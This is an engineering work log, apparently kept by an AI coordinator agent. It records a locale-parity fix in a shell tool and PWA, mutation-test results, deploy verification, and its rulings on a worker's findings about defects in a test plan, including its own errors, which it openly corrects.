The earlier design panel argued a stat-then-read against a capped read op. Both were answering the
wrong question. The actual defect was never the cap's *size* — it was that three of `ccd`'s decisions
follow the **ambient locale**, and `ccd` sets none. `local LC_ALL=C`, the idiom `_lc_dec_ok` already
uses and documents, fixes the strip, the cap's unit and the grammar in one line, at two functions:

| site | what the shadow fixes |
|---|---|
| `_project_pool_state` | the `[[:space:]]` strip, the `-n 64` cap's UNIT, and its call to the grammar |
| `_pool_name_valid` | the grammar at BOTH call sites — reader and, crucially, **writer** |
| `_check_pools` (doctor) | the third reader, which repeats all three |
| `pools.ts` | the strip class spelled out as C's `[[:space:]]`, not JS `\s` |

And it makes `pools.ts`'s existing sufficiency argument TRUE rather than needing it rewritten: an
ASCII-only strip cannot remove a non-ASCII byte, so one is always left for the grammar to reject.
UTF-8 never spends fewer bytes than UTF-16 spends units, so the two caps agree in the only direction
that matters. **Parity is now provable rather than sampled.**

### Measured, not asserted

- **Red-first:** the new suite against `b879510f` — **15 failed / 54 passed**.
- **Green:** with the fix — **91 passed**.
- **Mutation matrix**, each guard removed ALONE: reader shadow RED(6), grammar shadow RED(4), server
  strip RED(7), doctor shadow RED(5), control `>=64`→`>64` RED(1).
- **The matrix found two holes in my own suite**, which is the entire reason for running it rather
  than trusting a green. Choosing the UTF-8 locale BY NAME picked `C.utf8`, whose collation is
  codepoint order — so the D-2522 block contrasted two locales that AGREE and stayed green with its
  guard deleted. And nothing drove the doctor at all. Both fixed; both blocks now select a locale by
  MEASURING the property and fail loudly if the box has none.

### One mistake worth recording, because it nearly cost the work

My mutation driver opened with `git checkout --` to restore the tree between mutations, while the fix
was still **uncommitted**. It reverted everything. Nothing was lost only because the edits were applied
by a script (`patch1.py`) rather than by hand — which is the argument for scripting an edit even when
it is six replacements. The rule I already had and did not follow: a mutation runner needs a tree it
may destroy, and the thing under test must be committed before it runs.


### PR #88 raised — `fix/pool-tag-locale-parity`

https://github.com/Synapsium-Labs/ccrc-pwa/pull/88 — 8 files, 792 insertions, 11 deletions, rebased
onto `eff13d1f` (#87, which also edits `ccd/ccd`; the only conflicts were the provenance marker line,
twice, resolved to main's value and re-stamped once at the end so the digest covers the combined body).

Carries **D-2519, D-2520, D-2521, D-2522** (the parity defects) and **D-2542** (the same collation
range on `_ws_project_valid`, found by the review). **D-2543** is filed REPORTED-NOT-TAKEN: `_rc_enabled`
squeezes whitespace with the same locale-dependent class and decides whether sessions spawn with
`--remote-control`, but it is a different subsystem and a change scoped "one tag, one answer" should
not quietly grow a remote-control fix.

**It does not carry D-2008.** That stays parked on the argument recorded above.

### What the adversarial round changed, and what it says about the first draft

Four lenses raised 29; 24 survived refutation, ~a dozen distinct. **Nearly every finding with teeth was
in the tests I had just written**, which is the honest result — the source fix was four one-line shadows
and a character class, and the risk was never there. The ones that mattered:

- The corpus never exercised **VT or FF**, so two of the six characters my own spelled-out class names
  could be deleted with every row still green. My guard had a hole the size of a third of its class.
- Every legal row was `pool-a`, so **a reader returning that constant passed them all**.
- The two `guards the guard` cases turned a HOST property into a hard failure — a box whose only UTF-8
  locale is `C.utf8` would go red for a tree with nothing wrong with it, and this repo is bound for
  public release with a documented-hermetic suite. They guard the PROBE now, the rows skip visibly, and
  a **source-level pin** asserts all four shadows exist, which runs everywhere. That is
  [[a-derived-guard-is-only-testable-where-it-runs]] arriving as a review finding rather than as
  foresight.
- The doctor check folded `pools-unreadable`, an unknown verdict and a dead interpreter into "not
  malformed", so six rows asserted almost nothing.
- The fixture's byte-boundary guards counted **UTF-16 units while their messages said bytes** —
  D-2521's own confusion, in the file shipping D-2521's correction.
- `poolTag.ts` claimed `source-bytes.test.ts` "keeps this file ASCII". It bans C0 and DEL and permits
  every byte above 0x7F. **A false mechanism claim, in the PR whose subject is false mechanism claims.**

Then the affected-suite run caught two more of mine that the review had not: a SECOND spelling of the
path to the ccd script (`single-definition.test.ts` reds on exactly that), and `skipIf` gating
EXECUTION but not the TYPE, so tsc refused the env assignment. Both real, both mine.

### Two process mistakes worth keeping

1. **The mutation driver opened with `git checkout --` while the fix was uncommitted, and reverted it.**
   Nothing was lost only because the edits came from a script. The rule already existed —
   [[mutation-agents-need-an-isolated-tree]] — and I applied it to subagents and not to myself.
2. **`node --check` passed a workflow script the workflow parser then rejected** for an unterminated
   string. A syntax check that does not use the same parser is not evidence about that parser.


### PR #88 MERGED — `79d6d045`, 2026-09-11 16:19:57Z

Operator merged. All four gating legs green (`test (server)`, `test (agent)`, `test (pwa)`, `build-pwa`);
`test-macos` was still IN PROGRESS at merge and **does not gate** — the same shape that once let me
report a green PR whose macOS leg was red ([[local-suites-are-not-ci]]), so it is being watched rather
than assumed. Verified on `origin/main` after the merge: all four locale shadows present in
`_project_pool_state`, `_pool_name_valid`, `_ws_project_valid` and the doctor's `_check_pools`.

Landed: **D-2519, D-2520, D-2521, D-2522, D-2542**. Filed but not taken: **D-2543** (`_rc_enabled`).

**AGENT-FIRST lane, and not urgent.** The change is inert until a first tag exists, so it ships on the
next agent deploy rather than needing one of its own. Deploying at all remains the operator's call.

### A defect I shipped, found by testing a path I had never run

After the merge I forced both locale probes to return null — the macOS/minimal-container shape — and ran
the suite. **29 tests skipped correctly, and one FAILED: my own replacement guard.**

Review had told me the two `guards the guard` cases turned a HOST property into a hard failure. I
converted them to `it.skipIf(...)` plus a source-level pin, which is the right shape — but the guard I
wrote in their place asserts a *different* host property, "some UTF-8 locale exists", and reds on a box
that has none. **I moved the failure surface instead of removing it**, in the fix for that exact defect
class, and could not have noticed because my box has the locale the branch is designed for.

The distinction I got wrong: "this box has no UTF-8 locale at all" is not "the probe is broken" — it is
one more thing I cannot measure here, so it belongs in the skip. Only a box that LISTS UTF-8 locales and
still fails a trivial `echo yes` probe indicates broken machinery.

**Latent, not live:** GitHub's ubuntu and macOS runners both carry `en_US.UTF-8`, so no CI leg reaches
it. It matters because this repo is bound for public release and the failure would land on an outside
contributor running a stock container, for a tree with nothing wrong with it.


## DEPLOYED — both lanes at `79d6d045`, 2026-09-11

Operator lifted the hold and authorised the deploy at 16:28Z.

### The hold was already moot, and nobody knew

**Before-state, measured rather than assumed:** both boxes were already at `eff13d1f` — PR #87's merge,
deployed 15:17Z (fleet) / 15:23Z (server) by another session. And `b879510f` (wave 3, PR #81) is an
ANCESTOR of `eff13d1f`. So **wave 3's server arm had been live since 15:23Z**, carried in by an unrelated
PR's deploy. The hold was not lifted today; it was broken this afternoon by a merge train, silently.
That is the shape [[ancestry-is-not-content]] warns about running in reverse: nobody checked what a
deploy CONTAINED, only what it was for.

### Order, decided rather than defaulted

`ccrc-deploy-topology` says the order is about who READS whom. Answered for this wave: the new `ccd`
EMITS nothing new, and wave 3's server arm journals nothing (no reader-widening of the 2b kind), so
neither lane needs the other. Default **agent-first** held, with no measured reason to invert.

### Agent lane — 16:30:44Z

`ccd 79d6d045`, and **all 26 `claude-session@*` units verified active with stable MainPIDs across 5 s**.
The `KillMode=process` preflight passed and the sanctioned sweep restarted every supervisor onto the new
inode without losing a session — including this one's.

**Verified by content and by behaviour, not by the version string:**
- installed `~/.local/bin/ccd` sha256 == the repo's, byte for byte (`ef0ae8a9…`)
- installed `~/ccrc/ccd/ccrc-doctor-checks` == the repo's (`f215a412…`). Its mtime is OLDER than the
  deploy because `install_atomic` preserves the source's — the reason this program's own memory says to
  compare the stamp, never mtimes.
- **live on the deployed binary, fixture HOME:** a U+3000-padded tag reads `malformed` under BOTH
  `LC_ALL=C` and `en_US.UTF-8` (D-2520 closed on the real fleet — those two disagreed before), and
  `_pool_name_valid` rejects `pool-<U+00E9>` under both (D-2522 closed).

### Server lane — 16:36:59Z

`ccrc.service` active, MainPID stable, `/health` reports the shipped sha, `dirty:false`. The shipped
bundle carries `replace(/[ \t\n\v\f\r]+$/, '')` and no `\s` strip remains anywhere in `dist`.

### One wart, deliberately not chased

The build stamp reads `"ref":"fix/pool-tag-locale-parity"` where the previous deploy read `"HEAD"`,
because `deploy.sh` takes it from `git rev-parse --abbrev-ref HEAD` and I deployed from a worktree on a
named branch sitting at `origin/main`. **Measured before deciding:** `shared/buildinfo.ts` only requires
`ref` to be a non-empty string and nothing gates on it, so the label is informational. Correcting it
would cost a second supervisor sweep across 26 live sessions for a cosmetic field — not a trade worth
making. **Deploy from a DETACHED HEAD at `origin/main` next time** and the label reads `HEAD` again.


---

## 2026-09-12 — the follow-up PR: the guard I shipped inside the fix (D-2588)

`test-macos` on `79d6d045` completed **success** at 16:54:56Z — measured, not assumed. That leg does not
gate, and this change was the riskiest possible surface for it (bash 3.2, BSD collation), which is why it
was watched rather than waved through. All five legs green.

### The defect

PR #88's review round turned two `guards the guard` cases from hard failures into skips, because a box
that lacks the property a block needs must not go red for a tree with nothing wrong with it. **The two
host shapes are different, and only one is `C.utf8`** — measured: `C.utf8` collates by codepoint so it
cannot exhibit D-2522, but it DOES classify U+3000 as `[[:space:]]`, so it exhibits D-2520 fine. The
D-2520 guard's host shape is a box with NO UTF-8 locale at all — which is why that guard was the one
that broke, and why one cause for both cases was the wrong account. **The replacement guard asserted a different property from the one its own comment
claims.** The comment says a null from `localeWhere` "must mean 'this box has no such locale' and never
'the probe is broken'"; the assertion was `expect(localeWhere('echo yes')).not.toBeNull()`, which cannot
tell those apart. On a box whose `locale -a` lists no UTF-8 locale at all — the exact host the skip
exists for — the honest answer reds.

**This is the same class one seam over.** The first version collapsed "cannot show the property" into
RED; its replacement collapsed "cannot show the property" into "the machinery is broken". Fixing a fold
by moving it is the failure mode this program keeps finding in its own fix rounds.

### Measured, not argued

The condition is unreachable on any box in this fleet, so it was **constructed**: a shim on `PATH` whose
`locale -a` prints only `C` and `POSIX`, which is what a minimal container really reports.

| run | before the fix | after |
|---|---|---|
| this box (3 UTF-8 locales) | 108 passed | **114 passed** |
| simulated box, no UTF-8 locale | **1 FAILED**, 29 skipped, 78 passed | **0 failed**, 29 skipped, 85 passed |

The 29 skipping correctly while the guard alone failed is the whole shape of the defect: every
host-gated row behaved, and the case whose job was to certify those skips was the one that broke.

### What the fix is

`probeVerdict(candidates, found)` — four conditions, four values: `found`, `no-locale-tool`,
`no-utf8-locale`, `probe-broken`. Only the last is a defect here. The candidate list is enumerated once
into `UTF8_LOCALES`, because the old `localeWhere` threw away the very list the question needs.

**And it is fed LITERALS.** A guard derived from the environment can only exercise the arm the running
box happens to be in, so the arm that matters elsewhere ships unexecuted on every box that ships it.
Lifting the decision into a pure function lets one table drive all four arms everywhere. That is this
program's own `a-derived-guard-is-only-testable-where-it-runs`, applied to the guard rather than to its
subject — the lesson had been learned about the SUBJECT and not yet about the guard.

### Mutation

| mutation | this box | what failed |
|---|---|---|
| none | GREEN 114 | — |
| `no-utf8-locale` arm → `probe-broken` (**the shipped fold**) | RED (2) | the `[] + null` row, distinctness |
| `no-locale-tool` arm → `no-utf8-locale` | RED (2) | the `null + null` row, distinctness |
| `probe-broken` arm → `found` (guard stops guarding) | RED (2) | the `probe-broken` row, distinctness |
| **control:** `localeWhere` always null while locales ARE listed | RED (1) | **the guard itself** |

The control is the row that matters, because the fix **weakens** an assertion. It still fires on real
machinery failure, naming the count it measured: "this box LISTS 3 UTF-8 locale(s) and `echo yes` still
found none under any of them". And the shipped fold re-run under the shim reproduces the original red
exactly (3 failed, 29 skipped) — joined by the two literal-fed rows, which is what makes it catchable
on a box that cannot host the condition.

### A protocol slip the tree caught

`deviation-refs.test.ts` went red: D-2588 was allocated and written into a test COMMENT but not yet
DEFINED in a plan, so the floor seed would have jumped to 2638 and burned the band 2547–2587 forever.
CLAUDE.md's rule is allocate and define **in the same act**, and the number written without being
defined seals its own band. Defined in the wave's plan; green.

### The review round found the same class AGAIN, inside this fix — PR #91

Four adversarial lenses, 19 findings, 3 surviving refutation. All prose, and the first is the reason the
round was run at all.

**The fix's own comments named a subsystem its assertion cannot observe.** Three sites said
`probe-broken` means "`LC_ALL` is not reaching the probe". The probe is `echo yes`, whose output is
locale-INVARIANT, so a dropped `LC_ALL` reads as `found` and can never reach that arm. The refuter set
out to kill the finding and measured five ways of breaking delivery — drop the `env` spread, never set
the key, misspell it, set it empty, baseline — and **all five returned `found`**. So the message sent a
maintainer to the one subsystem it provably cannot reach, and on a polluted-stdout failure it is flatly
false: `LC_ALL` IS delivered there while the message says it is not.

That is D-2588's own class committed inside D-2588's fix. Two rounds running, on the same file, the
defect has been *a claim outliving the assertion under it* — first `not.toBeNull()` under a comment
about host-vs-probe, then a failure message about `LC_ALL` under an assertion that cannot see `LC_ALL`.
**The pattern worth carrying: when a guard's message names a cause, ask what input would produce that
cause and check the guard actually fires on it.** Neither round's author did; both times a refuter
measuring the cause found the answer in minutes.

**The gap was closed, not just described.** `runUnder` is now the one place a probe is spawned under a
locale, and a new case asserts `LC_ALL` actually arrives over that same channel — sharing one spawn site
deliberately, because a second copy of the `env` spread would let the delivery check pass while
`localeWhere` dropped `LC_ALL` entirely. Mutating the spread two ways reds it; an identity stub of the
carrier stays GREEN and is reported as such, with those two reds as the control that makes the green
mean "undetectable by construction" rather than "nothing drives this".

The other two survivors: a stale row count in a comment, and one host shape given for two converted
cases — `C.utf8` cannot exhibit D-2522 but DOES classify U+3000 as `[[:space:]]`, so it exhibits D-2520
fine; the D-2520 guard's shape is a box with no UTF-8 locale at all. That sentence was in this ledger
verbatim too, and both copies are corrected.

**PR #91** — https://github.com/Synapsium-Labs/ccrc-pwa/pull/91. Test-only; nothing here ships to a box.
472 tests green across 9 files.

### Two more of the same class, caught before CI could find them — and a tooling trap

The delivery check added in the review round arrived carrying the very defect it was written to close:
it looped over EVERY UTF-8 locale the box lists, calling the spawn with no `try`. **Linux lists three;
macOS lists close to two hundred** — so on the one platform this change is riskiest for, a single locale
that made bash exit non-zero would have leaked an unhandled exception and red a clean tree. Bounded to
the locales the file actually makes claims about, and a throw now comes back as a `THREW:` value the
assertion compares. Its failure message then said "did not arrive in the spawned shell", which does not
fit the throw case — a cause the assertion cannot distinguish, for the third time in two days. Both
fixed before push; a `probe made to exit non-zero` mutation now reds with one clean assertion.

**`gh pr edit --body-file` can FAIL SILENTLY on this repo.** It exits non-zero with a GraphQL *Projects
(classic) is being deprecated* error on `repository.pullRequest.projectCards`, and **the body is not
written** — the error is about a field in the response, so it looks incidental and is not. Verified by
reading the body back: zero matches for the new text. Use
`gh api repos/<org>/<repo>/pulls/<n> -X PATCH --input <json>` instead, and always read the body back
rather than trusting the command's output. This is the same shape as
[[graph-sweep-exit-code-is-a-claim]]: the tool's exit path is a claim, the artifact is the fact.

---

## 2026-09-12 09:38Z — run 43 DISPATCHED; the cap was pinned by a belief, not by work

`~/.local/bin/ccrc-api runs dispatch 43` had been refused `cap-concurrency` 7/7 since yesterday. Rather
than retry it a fourth time, I measured WHO held the seven and found five belonged to one programme
(`bug-fix-waves`), three of them parked rather than working — two `awaiting-review` with items at 9/9 and
3/3, one `merging`. `planned` does not count toward the cap; every other state does.

**Releasing another coordinator's claims is not mine to do**, so I sent a peer note (mail 709) with the
measured table and an explicit statement that I was not asking them to cut anything short — if the three
were genuinely open, waiting was the correct outcome.

The reply (711) was better than the question deserved:

- **Run 41 closed, slot freed.** Its PR had merged nine hours earlier, all five items settled, the tip
  re-measured equal to both halves of the fingerprint. Nothing was owed on it.
- **It had been held open on a belief that was never a mechanism.** The coordinator believed closing it
  would let the ordinary sweep ARCHIVE the workspace, so it held the run open to protect `plain-mesa`.
  `wave-lifecycle.md` §6 says the opposite: *"A merged workspace stays where it is — live, supervised,
  its PR merged — until a human archives it"*, and releasing a hold only changes which of two notices
  the next sweep sends. **The protection did not exist; the slot it cost was real.** That reason had
  already been reported to its owner as fact.
- **The other two were correctly parked and were NOT closed.** Both green and both still owing real work
  at their rebase — one regenerating the root lock file as the later lander, one re-reading a promise
  document against code rather than trusting a clean text merge. Closing either to free a slot would
  have marked it done with work outstanding, leaving a worker acting on a closed run. That is the right
  call and the note said so back.

**Run 43 dispatched into the freed slot** — `ccrc-pwa-clear-meadow`, workspace `clear-meadow` resumed,
brief queued, `skillState: present`. Fleet back at 7/7 with ours in it. The brief had been corrected
first: it still told the worker the wave-3 deploy hold was open.

**The general form, which is now program memory** ([[a-bundled-wave-pins-a-slot-per-bundle]]): a wave cut
into N bundles pins N fleet slots until the LAST bundle merges, because a green bundle awaiting its turn
in a merge order holds its slot exactly as hard as one that is working — and the cap is invisible from a
coordinator's own session list, which is what makes it a trap rather than an oversight. account-pools is
six waves single-file so it has never paid this, but the same cut was available to us.

---

## 2026-09-12 09:53Z — worker finding on Task 1; D-2591 issued, and the defect was larger than reported

Mail 716 from `ccrc-pwa-clear-meadow`, `kind: finding`, worker correctly stopped before commit with a
`D-TBD-untagged-account-prevents-empty-pool` token (worker clause 11). **Re-measured against source
rather than against the description**, which is this program's standing rule, and the finding holds —
and is a size larger than the worker saw.

### What the worker reported

The wave-4 plan's prescribed `poolLabelList` test expects `''` for tagged `pool-c`, but leaves
`claude-dev0` untagged; `shared/poolrule.ts` serves an untagged account into every pool, so the measured
result is `team·d`.

**Confirmed.** `pooled()` sets `pool: byId[a.id] ?? null`; TEST_ROSTER's home-able ids are `claude`,
`claude2`, `claude-corp`, `claude-dev0` (`gpt` is `homeAble:false` and never consulted); the block tags
only the first three. `poolRule`'s `if (accountPool === null) return { ok: true, why: 'untagged-account' }`
does the rest.

### What the worker missed, and it changed the ruling

**This is not the plan disagreeing with `poolrule.ts`. The block disagrees with ITSELF**, over one
shared `roster` const:

| test | expectation | needs `claude-dev0` |
|---|---|---|
| `tagged('pool-b')` | `'team·alt and team·d'` | **INCLUDED** — `team·d` can only be there by the untagged rule |
| `tagged('pool-c')` | `''` | **EXCLUDED** |

So `poolrule.ts` is not the outsider: **test 1 already agrees with it.** Whichever way it resolves, one
of the two prescribed expectations is wrong as written. Neither option the worker offered is right —
(b) deletes the empty-pool case, whose title names the strand that Task 9's cell and Task 10's banner
exist to surface; (a) as stated fixes test 3 by breaking test 1, trading the untagged-account case for
the empty-pool one. Both are worth keeping, and untagged-account is poolrule's permissive arm, the one
an implementation reasoning only about name equality drops silently.

**Ruled:** leave the shared roster for tests 1 and 2; give the empty-pool test its OWN roster with every
home-able account tagged and none `pool-c`. Both cases survive and each fixture says what its test is about.

### The product fact underneath it

**An empty label list requires EVERY home-able account to be tagged.** One untagged home-able account
anywhere on the fleet and `poolLabelList` can never be empty — so **the stranded surfaces cannot fire
under partial tagging.** The worker is to check Task 9's strand cell and Task 10's banner against that
and report either way; if either is specified as though stranding is reachable under partial tagging
that is a SECOND deviation with its own number, not to be folded into D-2591 and not to be self-minted
([[a-constraint-naming-the-allocator-invites-a-mint]]).

`FleetGroup.stranded` does not exist on the wire yet — it is wave 4's own Task 4 — so there was no
shipped definition to check this against, only the plan and `poolrule.ts`.

**D-2591 issued** (floor 2592), to be written up by the worker in the plan's Deviations section in the
same commit that uses it. Mail 717 (`kind: answer`; `ruling` is not a `MailKind` — the six are
`finding`/`question`/`answer`/`status`/`artifact`/`unknown`). Finding 716 acked.

---

## 2026-09-12 10:03Z — the worker refuted my ruling's extra claim, and was right twice over

Mail 722, `kind: status`. I had asked the worker to check Tasks 9/10 against my claim that *the stranded
surfaces cannot fire under partial tagging*, and to report either way. They reported **no second
deviation**, with citations. Measured against `origin/main`, they are right and I was wrong twice.

**Error 1 — the inference.** I reasoned from `poolLabelList`, a pure label projection applying the POOL
rule alone, and generalised it to the strand surfaces, which are not that. `_strand_why`'s own comment
says *"THIS FUNCTION'S OWN ORDER is pool, then `_account_ok`, then `_avail`"*, and its loop emits
`$cand:disabled`, `$cand:missing` and an `_avail` arm below them. **An untagged candidate passes
`_pool_ok` and can still fail to be an eligible AVAILABLE target**, so partial tagging strands exactly
as the worker said. In-pool and placeable are different predicates and the second is strictly narrower.

**Error 2 — and it is the one worth carrying.** I had written *"`FleetSession.stranded` does not exist
on the wire yet — it is wave 4's own Task 4"*. I had grepped **this worktree**, found nothing, and
reported the absence as a fact. **The worktree was 28 commits behind `origin/main`.** On main the field
is right there:

```
readonly stranded: { readonly at: number; readonly reason: string } | null;
```

a durable marker at `$REG/<id>.stranded` written by `_strand_mark` — landed by wave 3, exactly as the
plan says. An empty grep proves what you SEARCHED, not what you claim
([[a-negative-search-is-not-proof]]), and I searched the wrong tree. The failure is worse for a
coordinator than for anyone else: **rulings are measurements, and a stale checkout silently poisons
every one of them.**

**What it did NOT change: D-2591.** On finding the staleness I re-verified the ruling against
`origin/main` rather than assuming it survived. `shared/poolrule.ts` differs from the stale copy by
**eleven lines of comment** and `pwa/test/rosterFixture.ts` by a three-line comment on the `gpt` entry —
`poolRule`'s body and `TEST_ROSTER`'s five entries are **byte-identical** on main. The finding and the
ruling stand unchanged.

**Retracted to the worker (mail 725):** the consequence I hung on the precondition. *"An empty label
list requires every home-able account to be tagged"* is true **of `poolLabelList`** and is why the
empty-pool test needs its own roster; the claim about what stranding requires is false and was withdrawn.

**Fixed at the root, not just apologised for:** this worktree is merged current with `origin/main`
(behind-count 0; the one add/add conflict was the `ccd-queue` plan, resolved to the copy carrying
D-2475's correction of the stale twelve-site cardinal — main's copy still asserted twelve). **From here,
ruling measurements are taken with `git show origin/main:<path>`, never from the checkout underfoot.**

---

## 2026-09-12 10:11Z — D-2597: the plan prescribed a REFACTOR and called it a mutation

Mail 729, worker's second finding, again stopped before commit with a complete `D-TBD` entry. Measured
at `origin/main` with the checkout verified current first (behind-count 0) — the discipline the previous
ruling's failure bought.

**Reproduced rather than reasoned.** Built all three variants and ran the PWA's own `tsc` over them:

| variant | tsc |
|---|---|
| `return typeof p === 'string' ? p : null;` (original) | PASSES |
| `return p ?? null;` (**the plan's mutation 4**) | **PASSES — no error** |
| `return p;` (the worker's proposal) | `TS2322: Type 'string \| null \| undefined' is not assignable to type 'string \| null'` |

The worker is right, and their replacement is better than they claimed: **`return p` emits the plan's
own PREDICTED ERROR TEXT verbatim.** That is the tell for what happened — the author meant *delete the
guard*, wrote a replacement that preserves its semantics (`??` folds `undefined` AND `null` to `null`,
so the annotation stays `string | null`), and kept the error text the deletion would have produced.
**A mutation that cannot change behaviour is a refactor, and a refactor can never red.**

### The half the worker did not find, and it strengthens the guard

Plan line 507 ends *"the compiler is the mechanism for this one; keep the runtime test as the reader's
explanation."* **Measured false** for the corrected mutation: under `return p` the older-wire row
returns `undefined`, and `expect(undefined).toBeNull()` fails — ran it, 1 failed / 1 total. Vitest does
not typecheck, so the suite genuinely runs and genuinely reds.

So **both** fire under `return p`. That matters beyond tidiness: a compiler complaint says a future edit
would not COMPILE; a red test says something OBSERVES the behaviour. The second is the stronger guard,
and the plan's sentence talks a reader out of it. D-2597 carries both halves — the prescribed mutation
is inert, and the "compiler is the mechanism" note is wrong.

**D-2597 issued** (floor 2598), mail 731, finding 729 acked. Also told the worker to say in the commit
message that they stripped the stray leading `+` characters an implementation agent left in the plan
body as diff residue — flagged by them rather than quietly fixed, which is the right instinct.

**Both of this worker's findings so far were real, and in both the plan was the defective party** — once
self-contradictory (D-2591), once prescribing an inert mutation with a correct prediction attached
(D-2597). Worth noting for the wave: this plan's Task 1 has been wrong twice in its own verification
apparatus, so the remaining mutation rows deserve the same skepticism rather than the benefit of the doubt.

---

## 2026-09-12 10:26Z — D-2598: a cardinal that does not survive counting (third time on Task 1)

Mail 743, worker's third finding. Plan line 498 says *"Expected: PASS, 22 tests"*; the block it points
at holds **24**.

**Counted independently before reading the worker's arithmetic**, and cross-checked two further ways —
a hand count of a hand count is not a measurement:

| check | result |
|---|---|
| per-describe: 4 + 6 + 5 + 4 + 2 + 3 | **24** |
| `grep -cE '^\s*it\('` over the exact fence (124–299) | **24** |
| `grep -cE '^describe\('` | 6 |
| `grep -c 'it.each'` | **0** — so `it(` calls equal TESTS; no row-multiplying table |

**Ruled: write 24, but DERIVE it** — this program has already ruled on this exact shape and the ruling
binds us. **D-2475** (ccd-queue plan) is the same defect: a headline asserting "twelve guard sites" over
a list enumerating ten mandatory plus conditional groups. *A cardinal in a plan is a claim about a list,
and it goes stale the moment the list is edited.* I resolved a merge conflict in favour of that very
correction this morning — main's copy still asserted twelve — so leaving a bare `24` here would
re-commit the defect we just spent a number correcting.

The number is **kept**, not deleted, because a bare "expected PASS" would not catch the failure mode the
step exists for — a block copied INCOMPLETELY. It is the *provenance* that was missing: the step must
say the count is derived from the block above, tell the next editor to re-derive it, and warn that
`it.each` rows multiply, which is the one way the derivation itself breaks.

Noted to the worker that the D-2591 fix does **not** move the count: giving the empty-pool assertion its
own fully tagged roster changes a FIXTURE, not the number of `it(` calls.

**D-2598 issued** (floor 2599), mail 745, finding 743 acked. To be defined naming D-2475 as precedent,
not as a new rule.

### Standing posture for this wave, as of now

**Three findings, three times the plan was the defective party** — self-contradictory (D-2591), an inert
mutation carrying a correct prediction (D-2597), a cardinal that does not survive counting (D-2598).
Task 1's verification apparatus has now been wrong three times in three inspections. The worker is
instructed to treat the remaining steps' numbers and expected-red strings as **claims to measure, not
instructions to follow**. That is the standing posture for the rest of wave 4, not a one-off — and it is
the opposite of the usual default, so it is written here rather than left as a mood.

---

## 2026-09-12 10:59Z — Task 2: D-2606 and D-2607. File order cannot fix lexical scope.

Mail 756, `kind: question`, worker stopped before any Task 2 source/test edit. Both re-measured at
`origin/main`, checkout verified current. Both hold; both recommendations taken.

### D-2606 — `asError` is describe-scoped, so NEITHER prescribed placement compiles

`pwa/test/api.test.ts:710` declares `const asError` **inside the callback** of
`describe('apiErrorText and the code translators that compose with it', …)`, with eleven uses, all
within that describe. Plan line 657 says: *"if it is defined below the insertion point, put this
`describe` immediately after the block that defines it rather than at the very end of the file."*

**That instruction is only coherent for a MODULE-SCOPE const**, where being later in the file is the
whole obstacle. `asError` is block-scoped to another callback, and **no sibling placement can see it** —
EOF, immediately after, anywhere. Moving a sibling around a scope boundary never crosses it.

**The plan reasoned about FILE ORDER when the problem is LEXICAL SCOPE**, and that is why the sentence
reads plausibly. It matters for how the entry is written: an anchor that drifted is a stale citation,
and this is a prescription that **could not have worked at any line number the file ever had**.

**Ruled:** hoist `asError` to module scope, body byte-identical, existing uses untouched, then append
the sibling describe. The alternatives are worse — nesting the pool tests inside that describe files
them under a title about the `apiErrorText`/`uploadErrorText` composition hazard, mislabelling them;
duplicating the helper puts a second copy of a test primitive in one file, the thing this repo spends a
whole suite forbidding elsewhere. A helper used by two describes belongs at module scope.

### D-2607 — the alphabetical import slot is wrong

`pwa/src/lib/api.ts:5` reads `… PasskeyRegisterFinish, PasskeyRegisterStart, ProjectRow, PrView,
ReapResult, RunSummary …`. The plan says place `ProjectPoolWire` between `PrView` and `ReapResult`;
correct slot is **after `PasskeyRegisterStart`, before `ProjectRow`**.

**The convention is CASE-INSENSITIVE alphabetical, and the proof is already in the file:** `ProjectRow`
precedes `PrView`, which case-SENSITIVE ASCII would reverse (`V` = 0x56 < `o` = 0x6F). Told the worker
to record that reasoning, because the next person will otherwise re-derive the slot wrongly.

### Confirmed NOT a deviation

The worker classed the `API_ERROR_TEXT`/method locator drift (now 179–196, 442–449) as locator context
rather than a third deviation. **Correct, and confirmed so it does not get filed later.** Their brief
already told them the plan's anchors predate this branch and to navigate by symbol — a drifted citation
is expected wear. D-2606 is a deviation *precisely because it is not that*.

**D-2606, D-2607 issued** (floor 2608), mail 757, question 756 acked. Ten direct `it(` calls, zero
`it.each` — noted, and to be DERIVED in the step expectation rather than quoted (D-2598).

**Five findings, five times the plan was the defective party.** The posture set at D-2598 is holding and
is now clearly the right one for this wave.

---

## 2026-09-12 11:15Z — Task 1 review round: D-2608, D-2609, D-2610. One is High and real.

Mail 767. The worker's isolated Opus review found three, each Sonnet-verified; all three reproduced here
at `origin/main` before ruling.

### D-2610 (HIGH) — `projectPoolOf` reads `Object.prototype` for legal project names

`pools.byProject[project] ?? { state: 'untagged' }` over a `JSON.parse`d wire. **Reproduced end to end.**
Every name below is LEGAL under ccd's `_ws_project_valid` `^[A-Za-z0-9._-]+$`, and each yields a falsely
refusing verdict naming a pool that does not exist:

| project | verdict |
|---|---|
| `constructor` | `pool-mismatch`, projectPool **`'Object'`** |
| `toString` / `valueOf` / `hasOwnProperty` / `isPrototypeOf` | `pool-mismatch`, projectPool = the method name |
| `__proto__` | `pool-mismatch` with the `projectPool` key **absent** — a renderer prints `undefined` |

**Ruled:** `Object.hasOwn(...)`. ES2023 is the PWA's target and `Object.hasOwn` is already used in
`PasskeyNotice.tsx` and `spawnWords.ts` — idiomatic, not a new dependency. Both tests: an ABSENT
collision name reads `untagged`, and an OWN tagged collision key still reads tagged (the second is what
stops the fix becoming "collision names are always untagged").

**Why it is a plan defect and not paranoia — the framing given to the worker.** The server's own reader
is `read.tags.get(project)`, a **Map**, which has no prototype chain and is immune. The wire cannot carry
a Map, so `poolsWire` flattens it with `Object.fromEntries` into a `Record` — and the flattening silently
loses the own-vs-inherited distinction the Map gave for free. The PWA reader has to restore it. That is
*an adapter may not narrow a distinction it received*, read in the other direction: the Record is a
WIDER surface than the Map.

**Blast radius measured, not assumed:** line 449 is the ONLY index of `byProject` in the whole plan;
every other occurrence constructs a fixture. **Not shipped** — the server lane never had it.

### D-2608 — the predicted red is BACKWARDS, not merely imprecise

Ran the mutant: with the early return deleted, `poolSide` returns `'unknown'` for every account, the
loop tests `=== 'crossing'`, so every wrapper falls into the `else` and `eligible` comes out as the FULL
list — exactly what the test expects. Measured for all three inputs (null, unreadable, malformed):
eligible = all four, crossing = `[]`, unknown = false. The plan's `expected [] to equal [ 'claude', … ]`
is the opposite of what happens, and there is no `TypeError` either.

**The part the worker did not have:** the early return's ONLY observable contribution is the `unknown`
flag — the arrays are identical with and without it. The plan's prose reads as though the guard controls
the arrays; it does not. Told them to record that, or the next reader will think the corrected red is
weaker than the old one. It is not; it is the whole of the guard's effect.
